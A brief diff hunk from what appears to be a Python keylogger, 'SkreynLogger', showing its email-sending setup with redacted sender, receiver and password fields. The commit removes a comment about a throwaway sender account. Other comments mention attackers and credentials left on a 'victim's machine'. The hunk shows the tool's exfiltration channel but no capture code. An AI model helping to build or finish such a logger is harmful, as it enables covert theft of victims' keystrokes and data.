@@ -66,7 +66,7 @@ def send_email():
 	subject = ("SkreynLogger - " + str(time.time()).split('.')[0])
 	body = ""
 	receiver_email = "REDACTED"
-	sender_email = "REDACTED"			# this is a temporary email from 10minutemail.com, so it's okay to be here in the repo :)
+	sender_email = "REDACTED"			
 	password = "PASSWORD_REDACTED"			#please please please please plEASE DO NOT UPLOAD YOUR CREDENTIALS TO A GITHUB REPO
 							# honestly, even if this was used by an attacker... he'd probably have to use a dummy email account
 							# would be stupid to leave your email credentials inside a victim's machine :D
